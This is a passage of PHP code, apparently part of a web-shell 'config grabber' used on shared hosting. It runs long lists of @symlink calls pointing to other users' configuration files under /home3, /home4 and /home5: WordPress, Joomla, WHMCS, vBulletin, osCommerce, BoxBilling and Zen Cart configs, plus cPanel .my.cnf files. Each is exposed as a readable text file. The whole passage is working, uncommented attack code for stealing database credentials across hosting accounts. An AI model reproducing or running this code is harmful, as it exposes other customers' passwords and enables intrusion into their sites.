    @symlink('/home3/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home3/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home3/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home3/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home3/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home3/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home3/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
    //Home4
    
    @symlink('/home4/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home4/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home4/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home4/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home4/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home4/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home4/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home4/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home4/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home4/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home4/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home4/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home4/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home4/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home4/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home4/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home4/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home4/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home4/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home4/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home4/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home4/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home4/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home4/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
    
    //home5
    
    @symlink('/home5/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home5/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home5/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home5/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home5/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home5/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home5/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home5/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home5/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home5/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home5/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home5/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home5/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home5/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home5/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
